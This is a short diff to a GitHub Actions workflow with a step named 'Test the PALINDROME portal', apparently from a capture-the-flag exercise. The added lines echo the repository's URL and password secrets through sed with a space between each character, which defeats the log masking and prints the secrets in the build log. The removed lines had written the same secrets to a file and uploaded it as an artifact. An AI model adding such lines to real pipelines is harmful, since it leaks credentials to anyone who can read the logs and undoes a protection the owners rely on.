@@ -12,16 +12,7 @@ jobs:
       - name: Test the PALINDROME portal
         run: | 
           C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          echo ${{secrets.PORTAL_URL}} | sed 's/./& /g'
+          echo ${{secrets.PORTAL_PASSWORD}} | sed 's/./& /g'
           cat test
-      - name: Set up secret file
-        env:
-          DEBUG_PASSWORD: ${{ secrets.PORTAL_URL }}
-          DEBUG_SECRET_KEY: ${{ secrets.PORTAL_PASSWORD }}
-        run: |
-          echo $DEBUG_PASSWORD >> secrets.txt
-          echo $DEBUG_SECRET_KEY >> secrets.txt
-      - uses: actions/upload-artifact@v3
-        name: Upload Artifact
-        with:
-          name: SecretsVariables
-          path: secret.txt
+      
